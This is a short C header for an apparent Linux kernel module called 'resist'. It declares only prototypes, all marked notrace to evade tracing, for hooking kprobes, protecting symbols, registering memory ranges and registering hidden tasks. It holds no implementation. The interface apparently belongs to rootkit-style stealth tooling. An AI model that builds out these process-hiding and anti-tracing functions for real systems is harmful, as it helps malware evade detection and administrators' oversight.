#ifndef RESIST_H
#define RESIST_H

#include <linux/sched.h>

notrace int   sd_bootstrap_kprobe_hook(void);
notrace void  sd_protect_symbol(const char *symname);
notrace int   resist_init(void);
notrace void  resist_exit(void);

notrace void  sd_register_phys_range(const void *va, size_t size);
notrace void  sd_register_hidden_task(struct task_struct *task);

#endif
